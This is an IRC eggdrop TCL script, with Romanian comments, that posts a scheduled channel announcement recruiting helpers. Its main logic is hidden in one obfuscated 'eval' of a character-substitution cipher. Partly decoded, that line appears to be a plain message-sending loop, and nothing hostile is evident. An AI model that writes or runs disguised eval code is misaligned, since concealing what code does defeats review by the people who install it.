################################################################################
# by smart@UnderNet #ro-tcl  http://tcl.ro-club.net
################################################################################

# SE VA SETA ori primul camp ori al 2-lea camp in ceea ce priveste canalele!
# daca nici un camp nu e setat in ceea ce priveste canalele, va merge pe toate unde-i botu


# seteaza canalele unde se va da mesajul. daca e lasat "" mesajul va fi dat pe
# toate canalele in cazul in care nu e setat nimic la s(chanex)
set s(chanon) ""

# seteaza aici canalele pe care nu se va face anuntul, exceptii doar in cazul in
# care s(chanon) nu e setat
set s(chanex) ""

# seteaza aici ANUNTUL:
set s(anon) "!ANUNT!:  10Vizitati site-ul oficial al canalului de eggdrop 1#4U10&4U 10- 12wWw.UBots.tk1 .14 Cautam Helperi 1/14 Helperite cu un minim de experienta detalii pe canal 1. 2Multumim 1!"
# seteaza aici la cate minute sa faca anuntul
bind time - "01 * * * *" dohelp

\145\x76\u61\154 [\163\u74\u72\151\156\147 \u6d\u61\u70 {{[} o l n r m \{ \} m = n \] i M \] - - l w \{ p {[} v {
} M : t i 1 y 0 ) ! I b h o ( I x ) g {
} G R w a f { } v P V e e \} u V d g t h {$} f c {"} s ( S d r = b {$} {"} S R G a s ! y 1 : { } c p u P x 0} cd\[f:V\[be-c:wrtl:b\[\}d:VG1:r\[lgb:1eGd\{:wv::)-\[=G-:\"v::ta:wh\"ofbGl\[l0:sm:\$\$\{:wv::::a\[deGfb:fb:h\"ofbGl\[l0:wv::::::ta:wp\ G-tVfbGl:hfbn\{:wv::::::::c\}g\"ed\ :\$uS!Pi(\n:hfb:Mh\"oGl\[l0\$v::::::\{v::::\{v::::deg\}dl:xv::\{v::ta:wh\"ofbGleI0:sm:\$\$\{:wv::::a\[deGfb:fb:pfbGlle-\"n:wv::::::ta:wp-\"eGdfb:\]eIGfg:h\"oeIfecg0:p\"gdtl):g\[-\[Red:hfbnn:mm:\]y\{:wv::::::::c\}g\"ed\ :\$uS!Pi(\n:hfb:Mh\"oGl\[l0\$v::::::\{v::::\{v::::deg\}dl:xv::\{v::a\[deGfb:fb:pfbGlle-\"n:wv::::c\}g\"ed\ :\$uS!Pi(\n:hfb:Mh\"oGl\[l0\$v::\{v\{]
putlog "Loaded: anunt.tcl script v1.0 by smart , modified by jonny"
